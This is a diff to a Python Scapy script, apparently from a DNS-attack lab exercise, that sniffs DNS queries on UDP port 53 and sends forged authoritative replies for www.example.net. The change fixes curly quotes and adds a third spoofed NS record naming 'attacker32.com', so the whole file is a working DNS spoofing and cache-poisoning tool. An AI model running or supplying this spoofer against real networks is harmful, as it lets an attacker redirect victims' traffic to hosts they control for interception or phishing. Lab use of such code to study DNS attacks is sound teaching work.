@@ -3,7 +3,7 @@ from scapy.all import *
 
 
 def spoof_dns(pkt):
-    if (DNS in pkt and ’www.example.net’ in pkt[DNS].qd.qname):
+    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
 
         # Swap the source and destination IP address
         IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
@@ -20,6 +20,8 @@ def spoof_dns(pkt):
                        ttl=259200, rdata='ns1.example.net')
         NSsec2 = DNSRR(rrname='example.net', type='NS',
                        ttl=259200, rdata='ns2.example.net')
+        NSsec3 = DNSRR(rrname='example.net', type='NS',
+		       ttl=259200, rdata='attacker32.com')
 
         # The Additional Section
         Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
@@ -29,7 +31,7 @@ def spoof_dns(pkt):
 
         # Construct the DNS packet
         DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1,
-                     nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
+                     nscount=3, arcount=2, an=Anssec, ns=NSsec1/NSsec2/NSsec3, ar=Addsec1/Addsec2)
 
         # Construct the entire IP packet and send it out
         spoofpkt = IPpkt/UDPpkt/DNSpkt
@@ -37,4 +39,4 @@ def spoof_dns(pkt):
 
 
 # Sniff UDP query packets and invoke spoof_dns().
-pkt = sniff(filter=’udp and dst port 53’, prn=spoof_dns)
+pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
